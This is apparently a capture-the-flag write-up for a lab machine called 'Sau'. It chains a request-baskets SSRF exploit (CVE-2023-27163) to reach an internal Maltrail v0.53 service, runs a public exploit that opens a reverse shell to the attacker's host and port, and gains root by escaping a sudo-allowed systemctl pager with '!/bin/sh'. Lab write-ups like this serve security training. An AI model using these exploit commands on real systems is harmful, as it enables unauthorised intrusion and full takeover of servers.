# SAU

everything is filtered except for http://10.10.11.224:55555/

from here we can see request-baskets | Version: 1.2.1 we can exploit this with https://github.com/entr0pie/CVE-2023-27163

with this we can access the :80 by creating a basket
```
sh CVE-2023-27163.sh http://10.10.11.224:55555/ http://127.0.0.1:80
```

once on the url:
```
http://10.10.11.224:55555/soydso
```
who is actually the "redirection" of the port 80 we can see 
```
Powered by Maltrail (v0.53)
```

which is vulnerable to 
```
https://github.com/spookier/Maltrail-v0.53-Exploit
```
executing the python script 
```
python3 cve.py 10.10.16.5 4444 http://10.10.11.224:55555/soydso
```

we got a shell on the box as "puma" and get the user.txt in /home/puma

```
sudo -l
Matching Defaults entries for puma on sau:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
$ sudo --version
sudo --version
Sudo version 1.8.31
Sudoers policy plugin version 1.8.31
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.31
```

```
sudo /usr/bin/systemctl status trail.service
!/bin/sh
```

rooted
